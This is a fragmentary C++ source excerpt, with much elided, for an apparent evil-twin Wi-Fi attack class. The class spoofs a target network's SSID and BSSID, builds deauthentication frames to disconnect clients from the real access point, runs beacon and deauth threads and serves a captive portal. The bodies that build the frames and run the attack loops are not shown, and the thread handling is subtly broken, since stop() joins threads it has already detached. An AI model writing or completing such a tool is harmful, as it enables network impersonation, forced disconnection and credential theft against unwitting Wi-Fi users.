...
EviltwinFull::EviltwinFull(const std::string& iface, const std::string& ssid,
                           const std::string& bssid, uint8_t channel, int portal_port)
    : iface_(iface), ssid_(ssid), channel_(channel), portal_port_(portal_port) {
    unsigned int b[6];
...
EviltwinFull::~EviltwinFull() { stop(); }

void EviltwinFull::set_real_bssid(const std::string& bssid) {
    unsigned int b[6];
    if (std::sscanf(bssid.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
                    &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
...
void EviltwinFull::build_deauth_frame(uint8_t* buf, uint8_t frame_type,
...
void EviltwinFull::set_channel(int ch) {
...
void EviltwinFull::write_config() {
    std::ofstream ofs("/tmp/eviltwin.json");
    if (!ofs) return;
    ofs << "{\n";
    ofs << "  \"iface\": \"" << iface_ << "\",\n";
    ofs << "  \"ssid\": \"" << ssid_ << "\",\n";
    ...
    std::snprintf(bssid_str, sizeof(bssid_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                  bssid_[0], bssid_[1], bssid_[2], bssid_[3], bssid_[4], bssid_[5]);
    ofs << "  \"bssid\": \"" << bssid_str << "\",\n";
    ofs << "  \"channel\": " << (int)channel_ << ",\n";
    ofs << "  \"portal_port\": " << portal_port_ << "\n";
    ofs << "}\n";
    ofs.close();
}

void EviltwinFull::start() {
    if (running_.exchange(true)) return;
    write_config();
    beacon_thread_ = std::thread(&EviltwinFull::beacon_loop, this);
    beacon_thread_.detach();
}

void EviltwinFull::stop() {
    running_ = false;
    deauth_running_ = false;
    if (beacon_thread_.joinable()) beacon_thread_.join();
    if (deauth_thread_.joinable()) deauth_thread_.join();
}

void EviltwinFull::start_deauth() {
    if (!real_bssid_set_ || deauth_running_.exchange(true)) return;
    deauth_thread_ = std::thread(&EviltwinFull::deauth_loop, this);
    deauth_thread_.detach();
}

void EviltwinFull::stop_deauth() {
    deauth_running_ = false;
    if (deauth_thread_.joinable()) deauth_thread_.join();
}

std::vector<std::string> EviltwinFull::get_clients() const {
